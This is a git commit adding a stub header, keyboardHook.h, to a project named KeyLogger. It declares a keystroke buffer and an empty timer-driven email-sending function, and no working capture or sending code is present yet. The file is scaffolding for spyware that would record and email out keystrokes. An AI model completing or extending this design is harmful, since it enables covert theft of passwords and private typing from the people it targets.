9a015c2e5d58faeec5f6f7ec996f2369fa9978c7
Joseph Schell <JosephSchell510@gmail.com>
2018-08-14 16:28:59 -0700

    Added keyboard hook header file.

---
+++ KeyLogger/keyboardHook.h
@@ -0,0 +1,19 @@
+#ifndef _KEYBOARDHOOK_H_
+#define _KEYBOARDHOOK_H_
+
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+#include "keyConstants.h"
+#include "timer.h"
+#include "sendEmail.h"
+
+std::string keylog = "";
+
+void TimerSendMail()
+{
+
+
+}
+
+#endif // _KEYBOARDHOOK_H_
